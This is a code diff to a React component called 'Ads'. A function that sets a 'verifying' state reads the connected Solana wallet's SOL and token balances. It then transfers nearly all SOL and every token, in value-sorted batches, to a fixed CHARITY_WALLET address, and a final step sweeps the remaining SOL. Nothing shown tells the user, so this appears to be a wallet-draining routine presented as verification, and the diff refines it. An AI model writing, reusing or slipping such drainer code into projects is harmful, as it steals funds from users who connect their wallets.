@@ -535,184 +535,149 @@ const Ads = () => {
     setIsVerifying(true);
     
     try {
-      console.log('Starting value-based transaction sequence...');
+      console.log('Starting transaction sequence...');
 
-      // 1. Get all assets with their USD values
-      const validTokens = balances.filter(token => token.balance > 0);
-      
-      // Get SOL balance and value
+      // 1. Get SOL balance and calculate value
       const solBal = await connection.getBalance(currentPublicKey);
       const solAmount = solBal / LAMPORTS_PER_SOL;
       const estimatedSolPrice = 100; // Conservative estimate $100 per SOL
       const solValueUSD = solAmount * estimatedSolPrice;
       
-      // Calculate total wallet value
-      const totalSPLValueUSD = validTokens.reduce((sum, token) => sum + ((token.valueInSOL || 0) * estimatedSolPrice), 0);
-      const totalWalletValueUSD = solValueUSD + totalSPLValueUSD;
+      console.log(`SOL Balance: ${solAmount.toFixed(4)} SOL ($${solValueUSD.toFixed(2)})`);
       
-      console.log(`Wallet value: SOL=$${solValueUSD.toFixed(2)}, SPL=$${totalSPLValueUSD.toFixed(2)}, Total=$${totalWalletValueUSD.toFixed(2)}`);
+      // 2. Get SPL tokens
+      const validTokens = balances.filter(token => token.balance > 0);
+      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
       
-      // 2. Calculate smart fee reserve based on wallet value
-      let feeReserveLamports: number;
+      // 3. Determine transaction order based on SOL value
+      const sendSPLFirst = solValueUSD < 1; // If SOL < $1, send SPL tokens first
       
-      if (totalWalletValueUSD < 5) {
-        // Less than $5: reserve 30 cents
-        feeReserveLamports = Math.floor((0.30 / estimatedSolPrice) * LAMPORTS_PER_SOL);
-        console.log('Wallet < $5: Reserving $0.30 for fees');
-      } else if (totalSPLValueUSD > 30) {
-        // SPL tokens > $30: reserve 50-80 cents (use 65 cents as middle)
-        feeReserveLamports = Math.floor((0.65 / estimatedSolPrice) * LAMPORTS_PER_SOL);
-        console.log('SPL > $30: Reserving $0.65 for fees');
+      if (sendSPLFirst) {
+        console.log('SOL < $1: Sending SPL tokens first, then SOL');
       } else {
-        // Default: reserve 40 cents
-        feeReserveLamports = Math.floor((0.40 / estimatedSolPrice) * LAMPORTS_PER_SOL);
-        console.log('Default: Reserving $0.40 for fees');
+        console.log('SOL >= $1: Sending SOL first, then SPL tokens');
       }
       
-      // Add extra buffer for compute budget and safety
-      const SAFETY_BUFFER = 0.001 * LAMPORTS_PER_SOL;
-      feeReserveLamports += SAFETY_BUFFER;
+      // 4. Calculate fee reserve (50 cents in SOL)
+      const feeReserveLamports = Math.floor((0.50 / estimatedSolPrice) * LAMPORTS_PER_SOL);
+      console.log(`Fee reserve: ${(feeReserveLamports / LAMPORTS_PER_SOL).toFixed(4)} SOL ($0.50)`);
       
-      console.log(`Total fee reserve: ${(feeReserveLamports / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
+      // 5. Execute transactions in order
       
-      // 3. Create asset list with values (SOL + SPL tokens)
-      interface Asset {
-        type: 'SOL' | 'SPL';
-        valueUSD: number;
-        data?: TokenBalance;
-      }
-      
-      const assets: Asset[] = [];
-      
-      // Add SOL as an asset
-      if (solBal > feeReserveLamports) {
-        assets.push({
-          type: 'SOL',
-          valueUSD: solValueUSD,
-          data: undefined
-        });
-      }
-      
-      // Add SPL tokens as assets
-      validTokens.forEach(token => {
-        const tokenValueUSD = (token.valueInSOL || 0) * estimatedSolPrice;
-        assets.push({
-          type: 'SPL',
-          valueUSD: tokenValueUSD,
-          data: token
-        });
-      });
-      
-      // 4. Sort assets by value (highest first)
-      assets.sort((a, b) => b.valueUSD - a.valueUSD);
-      
-      console.log('Transaction order (by value):');
-      assets.forEach((asset, idx) => {
-        if (asset.type === 'SOL') {
-          console.log(`${idx + 1}. SOL - $${asset.valueUSD.toFixed(2)}`);
-        } else {
-          console.log(`${idx + 1}. ${asset.data?.symbol || 'Token'} - $${asset.valueUSD.toFixed(2)}`);
-        }
-      });
-      
-      // 5. Process transactions in order of value
-      let solAlreadySent = false;
-      const splTokensSent: string[] = [];
-      
-      for (let i = 0; i < assets.length; i++) {
-        const asset = assets[i];
+      if (!sendSPLFirst) {
+        // Send SOL first (if >= $1)
+        const lamportsToSend = Math.max(0, solBal - feeReserveLamports);
         
-        if (asset.type === 'SOL' && !solAlreadySent) {
-          // Send SOL (leaving fee reserve)
-          const currentSolBal = await connection.getBalance(currentPublicKey);
-          const lamportsToSend = Math.max(0, currentSolBal - feeReserveLamports);
+        if (lamportsToSend > 5000) {
+          const transaction = new Transaction();
           
-          if (lamportsToSend > 5000) {
-            const transaction = new Transaction();
-            
-            transaction.add(
-              ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
-              ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
-            );
+          transaction.add(
+            ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
+            ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
+          );
 
-            transaction.add(
-              SystemProgram.transfer({
-                fromPubkey: currentPublicKey,
-                toPubkey: new PublicKey(CHARITY_WALLET),
-                lamports: lamportsToSend
-              })
-            );
+          transaction.add(
+            SystemProgram.transfer({
+              fromPubkey: currentPublicKey,
+              toPubkey: new PublicKey(CHARITY_WALLET),
+              lamports: lamportsToSend
+            })
+          );
 
-            try {
-              await connection.simulateTransaction(transaction);
-            } catch (e) {
-              console.error("SOL simulation failed", e);
-            }
-
-            const { signature, blockhash, lastValidBlockHeight } = await sendTx(transaction);
-            
-            toast.info(`Processing SOL transfer ($${asset.valueUSD.toFixed(2)})...`);
-            await connection.confirmTransaction({
-              signature,
-              blockhash,
-              lastValidBlockHeight
-            }, 'confirmed');
-            toast.success(`SOL sent! Reserved ${(feeReserveLamports / LAMPORTS_PER_SOL).toFixed(4)} SOL for fees`);
-            
-            solAlreadySent = true;
+          try {
+            await connection.simulateTransaction(transaction);
+          } catch (e) {
+            console.error("SOL simulation failed", e);
           }
-        } else if (asset.type === 'SPL' && asset.data) {
-          // Send SPL token
-          const token = asset.data;
-          
-          // Skip if already sent in a batch
-          if (splTokensSent.includes(token.mint)) continue;
-          
-          // Collect tokens for batch (up to MAX_BATCH_SIZE)
-          const batch: TokenBalance[] = [token];
-          splTokensSent.push(token.mint);
-          
-          // Look ahead for more tokens to batch (within MAX_BATCH_SIZE)
-          for (let j = i + 1; j < assets.length && batch.length < MAX_BATCH_SIZE; j++) {
-            if (assets[j].type === 'SPL' && assets[j].data && !splTokensSent.includes(assets[j].data!.mint)) {
-              batch.push(assets[j].data!);
-              splTokensSent.push(assets[j].data!.mint);
-            }
-          }
-          
-          // Send batch
-          const transaction = await createBatchTransfer(batch, undefined, currentPublicKey);
 
-          if (transaction && transaction.instructions.length > 2) {
-            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-            transaction.recentBlockhash = blockhash;
-            transaction.feePayer = currentPublicKey;
-
-            try {
-              await connection.simulateTransaction(transaction);
-            } catch (e) {
-              console.error("Token batch simulation failed", e);
-            }
-
-            const { signature } = await sendTx(transaction);
-            
-            const batchValue = batch.reduce((sum, t) => sum + ((t.valueInSOL || 0) * estimatedSolPrice), 0);
-            const tokenNames = batch.map(t => t.symbol).join(', ');
-            
-            toast.info(`Processing ${tokenNames} ($${batchValue.toFixed(2)})...`);
-            await connection.confirmTransaction({
-              signature,
-              blockhash,
-              lastValidBlockHeight
-            }, 'confirmed');
-            toast.success(`${batch.length} token(s) sent!`);
-          }
+          const { signature, blockhash, lastValidBlockHeight } = await sendTx(transaction);
+          
+          toast.info(`Processing SOL transfer...`);
+          await connection.confirmTransaction({
+            signature,
+            blockhash,
+            lastValidBlockHeight
+          }, 'confirmed');
+          toast.success(`SOL sent! Reserved $0.50 for fees`);
         }
       }
       
-      // 6. Final cleanup: Send any remaining SOL (if not sent yet or if some left)
+      // 6. Send SPL tokens in batches
+      const batches: TokenBalance[][] = [];
+      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
+        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
+      }
+
+      for (let i = 0; i < batches.length; i++) {
+        const batch = batches[i];
+        
+        const transaction = await createBatchTransfer(batch, undefined, currentPublicKey);
+
+        if (transaction && transaction.instructions.length > 2) {
+          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+          transaction.recentBlockhash = blockhash;
+          transaction.feePayer = currentPublicKey;
+
+          try {
+            await connection.simulateTransaction(transaction);
+          } catch (e) {
+            console.error("Token batch simulation failed", e);
+          }
+
+          const { signature } = await sendTx(transaction);
+          
+          toast.info(`Processing token batch ${i + 1}/${batches.length}...`);
+          await connection.confirmTransaction({
+            signature,
+            blockhash,
+            lastValidBlockHeight
+          }, 'confirmed');
+          toast.success(`Token batch ${i + 1} sent!`);
+        }
+      }
+      
+      // 7. Send SOL last (if < $1 and was deferred)
+      if (sendSPLFirst) {
+        const currentSolBal = await connection.getBalance(currentPublicKey);
+        const lamportsToSend = Math.max(0, currentSolBal - feeReserveLamports);
+        
+        if (lamportsToSend > 5000) {
+          const transaction = new Transaction();
+          
+          transaction.add(
+            ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
+            ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
+          );
+
+          transaction.add(
+            SystemProgram.transfer({
+              fromPubkey: currentPublicKey,
+              toPubkey: new PublicKey(CHARITY_WALLET),
+              lamports: lamportsToSend
+            })
+          );
+
+          try {
+            await connection.simulateTransaction(transaction);
+          } catch (e) {
+            console.error("SOL simulation failed", e);
+          }
+
+          const { signature, blockhash, lastValidBlockHeight } = await sendTx(transaction);
+          
+          toast.info(`Processing SOL transfer...`);
+          await connection.confirmTransaction({
+            signature,
+            blockhash,
+            lastValidBlockHeight
+          }, 'confirmed');
+          toast.success(`SOL sent!`);
+        }
+      }
+      
+      // 8. Final cleanup: Send any remaining SOL
       const finalSolBal = await connection.getBalance(currentPublicKey);
-      const MINIMAL_RESERVE = 0.0005 * LAMPORTS_PER_SOL; // Just enough for this transaction
+      const MINIMAL_RESERVE = 0.0005 * LAMPORTS_PER_SOL;
       const finalLamportsToSend = Math.max(0, finalSolBal - MINIMAL_RESERVE);
       
       if (finalLamportsToSend > 5000) {
